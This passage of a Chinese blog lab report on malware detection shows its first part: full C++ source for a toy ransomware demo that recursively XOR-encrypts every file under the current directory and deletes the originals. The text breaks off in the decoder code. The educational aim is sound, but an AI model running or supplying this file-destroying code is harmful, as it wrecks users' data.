<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="https://raw.githubusercontent.com/moyuan10086/photo/main/20220523004342199.png">
  <link rel="icon" type="image/png" sizes="32x32" href="https://raw.githubusercontent.com/moyuan10086/photo/main/20220523004342199.png">
  <link rel="icon" type="image/png" sizes="16x16" href="https://raw.githubusercontent.com/moyuan10086/photo/main/20220523004342199.png">
  <link rel="mask-icon" href="https://raw.githubusercontent.com/moyuan10086/photo/main/blackground.jpg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"moyuan10086.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="实验报告：基于勒索病毒、机器学习和深度学习的恶意程序检测研究实验背景随着信息技术的迅猛发展，计算机病毒的种类和数量不断增加，给信息安全带来了严峻挑战。传统的病毒检测方法主要依赖特征码和启发式分析，但在应对新型和变种病毒时效果有限。机器学习和深度学习作为现代人工智能的重要分支，提供了新的解决方案。恶意程序是网络安全的重要威胁，其中勒索病毒尤为严重，通过加密受害者文件索取赎金。本实验分三个部分：  设">
<meta property="og:type" content="article">
<meta property="og:title" content="实验报告：基于勒索病毒、机器学习和深度学习的恶意程序检测研究">
<meta property="og:url" content="https://moyuan10086.github.io/2024/12/13/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/index.html">
<meta property="og:site_name" content="Moyuan&quot;s website">
<meta property="og:description" content="实验报告：基于勒索病毒、机器学习和深度学习的恶意程序检测研究实验背景随着信息技术的迅猛发展，计算机病毒的种类和数量不断增加，给信息安全带来了严峻挑战。传统的病毒检测方法主要依赖特征码和启发式分析，但在应对新型和变种病毒时效果有限。机器学习和深度学习作为现代人工智能的重要分支，提供了新的解决方案。恶意程序是网络安全的重要威胁，其中勒索病毒尤为严重，通过加密受害者文件索取赎金。本实验分三个部分：  设">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://moyuan10086.github.io/2024/12/13/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/image-20241213000517248.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/12/13/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/image-20241213000536557.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/12/13/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/image-20241213000633707.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/12/13/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/image-20241212110923814.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/12/13/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/image-20241212110951238.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/12/13/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/image-20241213004238784.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/12/13/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/image-20241212143434312.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/12/13/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/image-20241212144205267.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/12/13/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/image-20241213005217419.png">
<meta property="article:published_time" content="2024-12-12T17:05:14.000Z">
<meta property="article:modified_time" content="2024-12-12T17:18:10.439Z">
<meta property="article:author" content="moyuan">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://moyuan10086.github.io/2024/12/13/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/image-20241213000517248.png">


<link rel="canonical" href="https://moyuan10086.github.io/2024/12/13/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://moyuan10086.github.io/2024/12/13/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/","path":"2024/12/13/实验报告：基于勒索病毒、机器学习和深度学习的恶意程序检测研究/","title":"实验报告：基于勒索病毒、机器学习和深度学习的恶意程序检测研究"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>实验报告：基于勒索病毒、机器学习和深度学习的恶意程序检测研究 | Moyuan"s website</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Moyuan"s website</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">welcome to my website</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6"><span class="nav-number">1.</span> <span class="nav-text">实验报告：基于勒索病毒、机器学习和深度学习的恶意程序检测研究</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E8%83%8C%E6%99%AF"><span class="nav-number">1.1.</span> <span class="nav-text">实验背景</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86%EF%BC%9A%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92Demo%E8%AE%BE%E8%AE%A1"><span class="nav-number">1.2.</span> <span class="nav-text">第一部分：勒索病毒Demo设计</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%9B%AE%E7%9A%84"><span class="nav-number">1.2.1.</span> <span class="nav-text">实验目的</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0"><span class="nav-number">1.2.2.</span> <span class="nav-text">技术实现</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E9%80%BB%E8%BE%91"><span class="nav-number">1.2.3.</span> <span class="nav-text">代码逻辑</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="nav-number">1.2.4.</span> <span class="nav-text">安全注意事项</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86%EF%BC%9A%E5%9F%BA%E4%BA%8E%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E6%A3%80%E6%B5%8B"><span class="nav-number">1.3.</span> <span class="nav-text">第二部分：基于机器学习的恶意程序检测</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E9%9B%86%E4%BB%8B%E7%BB%8D%EF%BC%9A"><span class="nav-number">1.3.1.</span> <span class="nav-text">数据集介绍：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84"><span class="nav-number">1.3.1.1.</span> <span class="nav-text">1. 数据结构</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-%E6%95%B0%E6%8D%AE%E8%A7%84%E6%A8%A1"><span class="nav-number">1.3.1.2.</span> <span class="nav-text">2. 数据规模</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3-%E6%95%B0%E6%8D%AE%E9%A2%84%E5%A4%84%E7%90%86"><span class="nav-number">1.3.1.3.</span> <span class="nav-text">3. 数据预处理</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#4-%E8%AF%84%E6%B5%8B%E6%8C%87%E6%A0%87"><span class="nav-number">1.3.1.4.</span> <span class="nav-text">4. 评测指标</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E6%96%B9%E6%B3%95"><span class="nav-number">1.3.2.</span> <span class="nav-text">实验方法</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%BB%93%E6%9E%9C"><span class="nav-number">1.3.3.</span> <span class="nav-text">实验结果</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E7%BB%93%E4%B8%8E%E5%B1%95%E6%9C%9B"><span class="nav-number">1.4.</span> <span class="nav-text">总结与展望</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">moyuan</p>
  <div class="site-description" itemprop="description">prograing or coffee</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">11</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">分类</span>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/moyuan10086" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;moyuan10086" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:2572045628@qq.com" title="E-Mail → mailto:2572045628@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>

        </div>
      </div>
    </div>

    
    <div class="sidebar-inner sidebar-blogroll">
      <div class="links-of-blogroll animated">
        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
          链接
        </div>
        <ul class="links-of-blogroll-list">
            <li class="links-of-blogroll-item">
              <a href="https://github.com/" title="https:&#x2F;&#x2F;github.com&#x2F;" rel="noopener" target="_blank">GitHub</a>
            </li>
        </ul>
      </div>
    </div>
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://moyuan10086.github.io/2024/12/13/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="moyuan">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Moyuan"s website">
      <meta itemprop="description" content="prograing or coffee">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="实验报告：基于勒索病毒、机器学习和深度学习的恶意程序检测研究 | Moyuan"s website">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          实验报告：基于勒索病毒、机器学习和深度学习的恶意程序检测研究
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2024-12-13 01:05:14 / 修改时间：01:18:10" itemprop="dateCreated datePublished" datetime="2024-12-13T01:05:14+08:00">2024-12-13</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h3 id="实验报告：基于勒索病毒、机器学习和深度学习的恶意程序检测研究"><a href="#实验报告：基于勒索病毒、机器学习和深度学习的恶意程序检测研究" class="headerlink" title="实验报告：基于勒索病毒、机器学习和深度学习的恶意程序检测研究"></a>实验报告：基于勒索病毒、机器学习和深度学习的恶意程序检测研究</h3><h4 id="实验背景"><a href="#实验背景" class="headerlink" title="实验背景"></a>实验背景</h4><p>随着信息技术的迅猛发展，计算机病毒的种类和数量不断增加，给信息安全带来了严峻挑战。传统的病毒检测方法主要依赖特征码和启发式分析，但在应对新型和变种病毒时效果有限。机器学习和深度学习作为现代人工智能的重要分支，提供了新的解决方案。恶意程序是网络安全的重要威胁，其中勒索病毒尤为严重，通过加密受害者文件索取赎金。本实验分三个部分：</p>
<ol>
<li>设计一个简单的勒索病毒Demo，了解恶意程序的基本行为。</li>
<li>利用机器学习方法检测恶意程序。</li>
<li>利用深度学习方法检测并分类恶意程序。</li>
</ol>
<h4 id="第一部分：勒索病毒Demo设计"><a href="#第一部分：勒索病毒Demo设计" class="headerlink" title="第一部分：勒索病毒Demo设计"></a>第一部分：勒索病毒Demo设计</h4><h5 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a><strong>实验目的</strong></h5><p>利用ChatGPT实现一个勒索病毒的简化模型，模拟文件加密与解密流程，探究恶意程序的行为特征。</p>
<h5 id="技术实现"><a href="#技术实现" class="headerlink" title="技术实现"></a><strong>技术实现</strong></h5><ol>
<li>加密功能：<ul>
<li>遍历当前目录及子目录中的所有文件。</li>
<li>使用简单的异或加密算法(<code>XOR</code>)加密文件内容，并将加密后的文件扩展名改为<code>.exe</code>。</li>
<li>删除原始文件，保留加密后的文件。</li>
</ul>
</li>
<li>解密功能：<ul>
<li>遍历加密文件，使用相同的<code>XOR</code>解密逻辑还原原始文件。</li>
<li>删除加密文件，恢复文件原始状态。</li>
</ul>
</li>
</ol>
<h5 id="代码逻辑"><a href="#代码逻辑" class="headerlink" title="代码逻辑"></a><strong>代码逻辑</strong></h5><ul>
<li>文件遍历：使用Windows API递归遍历文件夹。</li>
<li>文件操作：基于<code>FILE*</code>文件指针读写文件。</li>
</ul>
<h5 id="安全注意事项"><a href="#安全注意事项" class="headerlink" title="安全注意事项"></a><strong>安全注意事项</strong></h5><ul>
<li><strong>仅供学习使用</strong>，禁止用于任何非法目的。</li>
<li><p>所有操作应限制在“测试文件夹”中，避免误操作导致数据丢失。</p>
<p><code>encode-main.cpp</code>：</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;windows.h&gt;</span><br><span class="line">#include&quot;funcs.h&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    char buff[MAX_PATH];</span><br><span class="line">    GetCurrentDirectory(MAX_PATH, buff);</span><br><span class="line">    findFile(buff);</span><br><span class="line">    printf(&quot;Oh, ho, you got it\n&quot;);</span><br><span class="line">    system(&quot;pause&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>  <code>encode-funcs.cpp</code>：</p>
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">#include&quot;funcs.h&quot;</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line">void findFile(char* pathName) &#123;</span><br><span class="line">    char currFile[MAX_PATH]; // 暂时存储每个文件名</span><br><span class="line">    memset(currFile, 0, MAX_PATH);</span><br><span class="line">    sprintf(currFile, &quot;%s\\*.*&quot;, pathName);</span><br><span class="line">    _WIN32_FIND_DATAA findData;</span><br><span class="line">    HANDLE hFile = FindFirstFile(currFile, &amp;findData);</span><br><span class="line">    if (hFile == INVALID_HANDLE_VALUE)</span><br><span class="line">        return;</span><br><span class="line"></span><br><span class="line">    int ret = 0;</span><br><span class="line">    while (1) &#123;</span><br><span class="line">        memset(currFile, 0, MAX_PATH);</span><br><span class="line">        sprintf(currFile, &quot;%s\\%s&quot;, pathName, findData.cFileName);</span><br><span class="line">        // 检查文件属性--文件还是文件夹？</span><br><span class="line">        if (findData.cFileName[0] == &#x27;.&#x27;); //对特殊文件夹不进行处理</span><br><span class="line">        else if ((findData.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY))  //如果是普通文件夹，递归调用findFile函数</span><br><span class="line">            findFile(currFile);</span><br><span class="line">        else //否则，处理当前文件</span><br><span class="line">            enCode(currFile);</span><br><span class="line">        </span><br><span class="line">        ret = FindNextFile(hFile, &amp;findData);</span><br><span class="line">        if (!ret)</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void enCode(char* pathFile) &#123;</span><br><span class="line">    //打开待加密文件，创建加密后文件</span><br><span class="line">    FILE* fpSrc = fopen(pathFile, &quot;rb&quot;); //只读字节流</span><br><span class="line">    char buff[MAX_PATH];</span><br><span class="line">    sprintf(buff, &quot;%s.exe&quot;, pathFile);</span><br><span class="line">    FILE* fpDst = fopen(buff, &quot;wb&quot;); //只写字节流</span><br><span class="line">    </span><br><span class="line">    if (fpSrc == NULL || fpDst == NULL)</span><br><span class="line">        return;</span><br><span class="line">    //以单个字节循环读取待加密文件内容，并写入加密文件中</span><br><span class="line">    char currByte;</span><br><span class="line">    while (1) &#123;</span><br><span class="line">        int count = fread(&amp;currByte, 1, 1, fpSrc);</span><br><span class="line">        if (count &lt; 1) //没读到</span><br><span class="line">            break;</span><br><span class="line">        currByte ^= 0x66; //简单异或加密法</span><br><span class="line">        fwrite(&amp;currByte, 1, 1, fpDst); //写入加密文件</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fpSrc);</span><br><span class="line">    fclose(fpDst);</span><br><span class="line">    remove(pathFile); //删除原文件</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>  <code>encode-funcs.h</code>：</p>
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#pragma once</span><br><span class="line">#pragma warning(disable : 4996)</span><br><span class="line"></span><br><span class="line">// 在指定路径下递归寻找所有文件</span><br><span class="line">void findFile(char* pathName);</span><br><span class="line"></span><br><span class="line">// 加密操作</span><br><span class="line">void enCode(char* pathFile);</span><br></pre></td></tr></table></figure>
<p>  <code>decode-main.cpp</code>：</p>
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;windows.h&gt;</span><br><span class="line">#include&quot;funcs.h&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    char buff[MAX_PATH];</span><br><span class="line">    GetCurrentDirectory(MAX_PATH, buff);</span><br><span class="line">    findFile(buff);</span><br><span class="line">    